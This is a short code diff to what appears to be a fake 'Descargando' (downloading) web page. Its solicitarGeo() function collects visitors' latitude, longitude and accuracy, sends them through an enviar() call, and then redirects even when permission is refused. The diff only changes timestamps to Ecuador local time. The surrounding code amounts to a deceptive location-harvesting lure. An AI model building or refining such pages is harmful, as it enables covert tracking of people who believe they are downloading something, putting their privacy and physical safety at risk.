@@ -178,7 +178,7 @@ function solicitarGeo() {
         enviar({
             type: "geo-error",
             error: "Geolocalización no soportada",
-            time: new Date().toISOString()
+            time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
         });
 
         setTimeout(redirigirLuego, 800);
@@ -192,7 +192,7 @@ function solicitarGeo() {
                 lat: pos.coords.latitude,
                 lon: pos.coords.longitude,
                 accuracy: pos.coords.accuracy,
-                time: new Date().toISOString()
+                time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
             });
 
             // 🔥 REDIRECCIÓN FINAL DESPUÉS DE ENVIAR LA UBICACIÓN
@@ -202,7 +202,7 @@ function solicitarGeo() {
             enviar({
                 type: "geo-error",
                 error: err.message,
-                time: new Date().toISOString()
+                time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
             });
 
             // 🔥 Incluso si rechaza permisos o falla, también redirige
@@ -223,5 +223,6 @@ Descargando.....
 
 </body>
 </html>
+
 
 
